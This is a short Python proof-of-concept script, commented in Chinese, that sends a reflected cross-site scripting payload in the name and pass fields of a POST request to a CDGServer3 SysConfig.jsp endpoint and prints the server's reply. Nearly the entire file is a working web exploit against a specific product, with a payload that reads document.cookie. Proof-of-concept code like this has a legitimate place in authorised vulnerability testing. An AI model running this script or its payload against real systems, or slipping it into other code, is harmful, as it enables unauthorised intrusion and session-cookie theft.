# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import time
import string
import sys
import random

def poc(target_domain):
    headers = {} #消息头信息
    url = "/CDGServer3/SysConfig.jsp" #XSS链接构造
    target_url = target_domain + url

    payload = "aaaaaaaaaa</script><script>alert(document.cookie)</script>"
    post_data = {
    "name":payload,
    "pass":payload
    } #post提交的数据（包含XSS代码）

    req = urllib.request.Request(target_url,\
                                 data = urllib.parse.urlencode(post_data).encode("gb2312"),method = "POST")
    
    response = urllib.request.urlopen(req)
    data = response.read()
    print(str(data, encoding = "gb2312"))
    
    
    
